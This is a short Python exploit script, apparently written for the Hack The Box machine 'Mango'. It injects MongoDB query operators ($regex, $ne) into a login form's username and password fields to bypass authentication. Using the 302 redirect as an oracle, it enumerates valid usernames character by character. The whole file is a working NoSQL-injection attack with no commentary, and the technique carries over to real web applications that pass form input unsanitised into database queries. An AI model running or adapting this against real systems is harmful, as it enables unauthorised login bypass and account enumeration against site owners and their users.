#!/usr/bin/python3
from requests import post
from string import ascii_lowercase


url = "http://staging-order.mango.htb/"

def findValidChar():
	valid=[]
	for ch in ascii_lowercase:
		regex = ch+".*"
		data = {'username[$regex]':regex,'password[$ne]':'password', 'login' :'login' }
		response = post(url,data=data,allow_redirects=False)
		if response.status_code == 302:
			valid.append(ch)
	return valid


def findInitials(valid):
	initials=[]
	for ch in valid:
		regex = "^"+ch+".*"
		data = {'username[$regex]':regex,'password[$ne]':'password', 'login' :'login' }
		response = post(url,data=data,allow_redirects=False)
		if response.status_code == 302:
			initials.append(ch)
	return initials

def findUsernames(initials,valid):
	usernames=[]
	username=""
	for initial in initials:
		username+=initial
		while True:
			obt = sendPayload(username,valid)
			if obt == None:
				usernames.append(username)
				username=""
				break
			else:
				username+=obt
	return usernames

def sendPayload(username,valid):
	for char in valid:
		regex = '^'+username+char+'.*'
		data = { 'username[$regex]' : regex, 'password[$ne]' : 'password', 'login' :'login' }
		response = post(url, data = data, allow_redirects=False)
		if response.status_code == 302:
			return char
	return None


if __name__ == '__main__':
	valid = findValidChar()
	print("VALID: ")
	print(valid)
	initials = findInitials(valid)
	print("INITIALS:")
	print(initials)
	usernames = findUsernames(initials,valid)
	print("USERNAMES:")
	print(usernames)
